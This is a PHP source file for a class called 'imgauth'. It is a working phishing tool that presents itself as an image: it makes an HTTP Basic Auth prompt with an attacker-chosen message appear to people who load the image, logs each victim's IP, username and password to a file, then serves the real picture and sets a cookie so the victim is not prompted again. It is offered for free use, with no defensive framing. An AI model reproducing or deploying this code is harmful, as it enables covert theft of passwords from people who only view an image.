<?php

/**
 * 
 * @author Joe Duncan <j.duncan@outlook.com>
 * @package imgauth
 * @copyright 2012 Joe DUncan
 * Use as pleased, "don't care license"
 */
 
 
class imgauth {

	/**
	 * Enable/Disable imgauth
	 */
	public $enable_log = false;

	/**
	 * Message to be displayed on Auth
	 * @var string
	 */
	public $message = "";

	/**
	 * Regex to block client IP's
	 * @var string
	 */
	public $disable_pattern  = "//";

	/**
	 * Client data, is set in __construct
	 * @var string
	 */
	public $client_ip,$client_passwd,$client_uname;

	/**
	 * Cookie name to block further use 
	 * @var string
	 */
	public $cookie = "sink";

	/**
	 * Path to logfile
	 * @var string
	 */
	public $logfile = "user.log";
	
	/**
	 * Log String format
	 * @var string
	 */
	 public $logstyle = '%1$s:%2$s:%3$s';

	/**
	 * Content-Type of Content to display
	 * @var string <add \r\n at end>
	 */
	public $content_type = "image/jpg\r\n";

	/**
	 * File path to content file
	 * @var string path
	 */
	public $content_file = "jpg.jpg";


	/**
	 * Last Error string [not in use]
	 * @var string
	 */
	public $last_error;

	/**
	 * Sets client data
	 */
	public function __construct() {
		$this->client_ip = $_SERVER['REMOTE_ADDR'];
		$this->client_uname = $_SERVER['PHP_AUTH_USER'];
		$this->client_passwd = $_SERVER['PHP_AUTH_PW'];
	}

	/**
	 * Trigger Tiger ---Raaaaarrr!
	 */
	public function exec() {

		//power?
		if(!$this->enable_log) {

			//display content
			$this->content_load();

			exit();
		}
	
		//check client IP
		if($this->check_client()) {
			
			//is blocked, display content
			$this->content_load();
			
			//out
			exit();
		} 

		if (is_null($this->client_uname) || empty($this->client_uname)) {
			
			//display Auth
			$this->header();
		}

		//Log user data
		$this->log_data();
		
		//display content
		$this->content_load();
	}

	/**
	 * Load content to be displayed if client is blocked or allready logged
	 */
	private function content_load() {
	
		//set given content-type
		header("Content-type: ".$this->content_type);
		
		//output content data
		$data = file_exists($this->content_file) && filesize($this->content_file)>0 ? file_get_contents($this->content_file):false;
		print($data);

	}

	/**
	 * Checks if client IP is blocked by $disable_pattern
	 * @uses disable_pattern
	 * @return int number of matches
	 */
	private function check_client() {
		return preg_match($this->disable_pattern,$this->client_ip);

	}


	/**
	 * Logs caught user data to given logfile
	 * 
	 */
	private function log_data() {

		//trim data
		trim($this->client_uname);trim($this->client_passwd);

		//check block cookie, make sure client username,password are not empty
		if(!isset($_COOKIE[$this->cookie]) && !empty($this->client_uname) && !empty($this->client_passwd)) {

			//prepare log data for logfile
			$str = vsprintf($this->logstyle,array($this->client_ip,$this->client_uname,$this->client_passwd));
			//$str = $this->client_ip.$this->logstyle.$this->client_uname.$this->logstyle.$this->client_passwd."\n";

			//Log data be happy
			$fp = fopen($this->logfile,"a");
			fwrite($fp,$str);
			fclose($fp);

			//set block cookie
			setcookie ($this->cookie, "1", time() + 3600*365);

		} else {
		
			//load content
			$this->content_load();
		}

	}

	/**
	 * Sets Header Auth
	 */
	private function header() {
	
		//set Auth message
		header('WWW-Authenticate: Basic realm="'.$this->message.'"');
		
		//Unautherized if not set
		header('HTTP/1.0 401 Unauthorized');
	}

	

}


?>
